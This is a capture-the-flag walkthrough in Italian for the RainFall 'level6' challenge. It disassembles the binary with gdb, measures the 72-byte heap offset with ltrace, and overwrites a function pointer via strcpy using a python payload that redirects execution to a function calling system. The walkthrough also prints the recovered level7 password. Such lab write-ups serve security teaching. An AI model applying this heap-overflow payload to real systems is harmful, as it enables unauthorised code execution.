# Level 6
Controlliamo le stringhe presenti nell'eseguibile:
```
level6@RainFall:~$ readelf -p '.rodata' level6

String dump of section '.rodata':
  [     8]  /bin/cat /home/user/level7/.pass
  [    29]  Nope
```
Eseguendo il programma scopriamo che questa volta l'input non viene presto dallo stdin
ma come primo argomento.
Disassembliamo con `gdb`:
```
level6@RainFall:~$ gdb -q level6
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f4  _init
0x08048340  strcpy
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini
(gdb) disass main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
(gdb) disass m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
End of assembler dump.
(gdb) disass n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
```
### Funzione `main`
Riserva 0x20 (32) byte nello stack e chiama per due volte `malloc` nel seguente modo:
```
malloc(64);
malloc(4);
```
Successivamente assegna al secondo puntatore (quello di dimensione 4) restituito da `malloc`
l'offset della funzione `m`, poi chiama la funzione `strcpy` copiando l'input dell'utente
nel primo puntatore (quello da 64 byte) e in fine chiama il secondo puntatore che a sua
volta punta alla funzione `m`.

### Funzione `m`
Chiama `puts` nel seguente modo:
```
puts("Nope");
```

### Funzione `n`
Chiama `system` nel seguente modo:
```
system("/bin/cat /home/user/level7/.pass");
```
### Soluzione
Il nostro obiettivo è quello di sovrascrivere il secondo puntatore restituito da `malloc`
con l'offset della funzione `n` così da poter chiamare system.
Allora provo nel seguente modo a verificare la distanza dei puntatori:
```
level6@RainFall:~$ ltrace ./level6 usavoia
__libc_start_main(0x804847c, 2, 0xbffff7e4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                               = 0x0804a008
malloc(4)                                                                = 0x0804a050
strcpy(0x0804a008, "usavoia")                                            = 0x0804a008
puts("Nope"Nope
)                                                             = 5
+++ exited (status 5) +++
```
```
level6@RainFall:~$ echo $((0x0804a050 - 0x0804a008))
72
```
Basterà scrivere 72 caratteri e in fine l'indirizzo della funzione `n`: `0x08048454`
e passarlo come argomento dell'eseguibile:
```
level6@RainFall:~$ ./level6 $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ su level7
Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
level7@RainFall:~$
```